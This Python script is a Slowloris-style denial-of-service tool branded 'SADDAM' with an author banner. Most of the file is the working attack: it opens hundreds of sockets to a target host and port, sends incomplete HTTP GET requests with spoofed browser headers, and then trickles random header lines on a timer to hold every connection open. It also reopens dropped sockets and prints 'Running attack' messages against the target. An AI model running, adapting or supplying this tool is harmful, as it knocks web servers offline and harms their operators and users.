   #usr/bin/env python
# -*- coding: utf-8 -*-
import os
import sys
import random
import time
import socket
import getpass
from progress.bar import Bar

# Clearing the SCREEN
class colors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    LIGHT_GRAY = '\033[37m'
    DARK_GRAY = '\033[90m'
    LIGHT_RED = '\033[91m'
    LIGHT_GREEN = '\033[92m'
    LIGHT_YELLOW = '\033[93m'
    LIGHT_BLUE = '\033[94m'
    LIGHT_MAGENTA = '\033[95m'
    LIGHT_CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKETHROUGH = '\033[9m'
    DOUBLE_UNDERLINE = '\033[21m'
    NORMAL_COLOR = '\033[22m'
    NORMAL_INTENSITY = '\033[22m'
    RESET_UNDERLINE = '\033[24m'
    RESET_BLINK = '\033[25m'
    RESET_REVERSE = '\033[27m'
    RESET_HIDDEN = '\033[28m'
    RESET_STRIKETHROUGH = '\033[29m'
    ORANGE = '\033[38;5;214m'  # Light Orange
    PURPLE = '\033[38;5;141m'  # Light Purple
    TEAL = '\033[38;5;37m'     # Teal
    PINK = '\033[38;5;206m'    # Light Pink
    LIME = '\033[38;5;154m'    # Lime Green
    CYAN_BLUE = '\033[38;5;39m'  # Cyan Blue
    DARK_GREEN = '\033[38;5;22m'  # Dark Green
    SKY_BLUE = '\033[38;5;111m'  # Sky Blue
    DARK_ORANGE = '\033[38;5;166m'  # Dark Orange
    INDIGO = '\033[38;5;57m'   # Indigo
    GRAY = '\033[38;5;242m'   
    MAROON = '\033[38;5;52m'   
    OCEAN_BLUE = '\033[38;5;21m'  
    GOLD = '\033[38;5;220m' 

os.system("clear")
print( """
╔════════════════════════════════════════════════════════════════╗
║                   \033[38;5;141m                                             ║   
║              --------------,        .---------------           ║              
║                 ---------   \  __  /    ----------             ║
║                   -------    \(  )/    --------                ║
║                     ------   . \/ -   -------                  ║
║                      ------  :    :  ------                    ║
║                         ----- :  ; -----                       ║
║                              //..\\                             ║
║                             //,..,\\                            ║
║                         ====UU====UU====                       ║
║                             ///|||\\\                           ║
║                                                                ║
║   \033[0m \033[38;5;39m █████═╗  ████═╗  █████═╗  █████═╗   ████═╗  ███═╗ ███═╗    ║
║   \033[0m \033[38;5;39m █ ╔═══╝  █ ╔█═╗  █ ╔══█═╗ █ ╔══█═╗  █ ╔█═╗  █ ╔█╗█══█═╗    ║
║   \033[0m \033[38;5;39m █ ║     █ ╔╝ █ ║ █ ║  █ ║ █ ║  █ ║ █ ╔╝ █ ║ █ ║ █ ║ █ ║    ║
║   \033[0m \033[38;5;39m █ ║     █ ║  █ ║ █ ║  █ ║ █ ║  █ ║ █ ║  █ ║ █ ║ █ ║ █ ║    ║
║   \033[0m \033[38;5;39m █████═╗ █ ║  █ ║ █ ║  █ ║ █ ║  █ ║ █ ║  █ ║ █ ║ █ ║ █ ║    ║
║   \033[0m \033[38;5;39m ╚═══█ ║ █ ╚══█ ║ █ ║  █ ║ █ ║  █ ║ █ ╚══█ ║ █ ║ ╚═╝ █ ║    ║
║   \033[0m \033[38;5;39m     █ ║ ██████ ║ █ ║  █ ║ █ ║  █ ║ ██████ ║ █ ║     █ ║    ║
║   \033[0m \033[38;5;39m █████ ║ █ ║  █ ║ █████ ║  █████ ║  █ ║  █ ║ █ ║     █ ║    ║
║   \033[0m \033[38;5;39m ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═╝  ╚═╝ ╚═╝     ╚═╝    ║
╚════════════════════════════════════════════════════════════════╝
""")
print(f"\033[21m╔{'═' * 64}╗\033[0m")
print(f"\033[21m║  v.1.0{' ' * 57}║\033[0m")
print(f"\033[21m║  Author By: KunFayz{' ' * 44}║\033[0m")
print(f"\033[21m╚{'═'  * 64}╝\033[0m")
regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
                    "Accept-language: en-US,en,q=0.5"]

def init_socket(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip,int(port)))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))

    for header in regular_headers:
        s.send('{}\r\n'.format(header).encode('UTF-8'))

    return s

def main():
    if len(sys.argv)<5:
        print("\033[32m┌[KunFayz•••\033[0m")
        print(("\033[32m└> Usage: {} https//example.co.il 443/80 300 1\033[0m)".format(sys.argv[0])))
        return

    ip = sys.argv[1]
    port = sys.argv[2]
    socket_count= int(sys.argv[3])
    bar = Bar('\033[1;32;40m Creating Sockets...', max=socket_count)
    timer = int(sys.argv[4])
    socket_list=[]

    for _ in range(int(socket_count)):
        try:
            s=init_socket(ip,port)
        except socket.error:
            break
        socket_list.append(s)
        next(bar)

    bar.finish()

    while True:
        print("\033[32m┌[••'\033[38;5;220mKunFayz ".format(len(socket_list)))
        print("\033[32m└>  \033[38;5;39m[ S A D D A M ] \033[31m•>\033[33m Running attack \033[38;5;206m" +str(ip)+ " |🇵🇸 \033[0m")
        print("\033[38;5;166m└>  \033[96m[ S A D D A M ] \033[34m•>\033[37m Running attack \033[38;5;111m" +str(ip)+ " |🇵🇸\033[0m")

        for s in socket_list:
            try:
                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
            except socket.error:
                socket_list.remove(s)

        for _ in range(socket_count - len(socket_list)):
            print("\033[32m┌[••'\033[38;5;220mKunFayz ".format(len(socket_list)))
            print("\033[32m└>  \033[33m[ S A D D A M ] \033[31m•>\033[33m Running attack \033[38;5;206m" +str(ip)+ " |🇵🇸\033[0m")
            print("\033[38;5;166m└>  \033[96m[ S A D D A M ] \033[34m•>\033[37m Running attack \033[38;5;111m" +str(ip)+ " |🇵🇸\033[0m")
            try:
                s=init_socket(ip,port)
                if s:
                    socket_list.append(s)
            except socket.error:
                break

        time.sleep(timer)

if __name__=="__main__":
    main()             
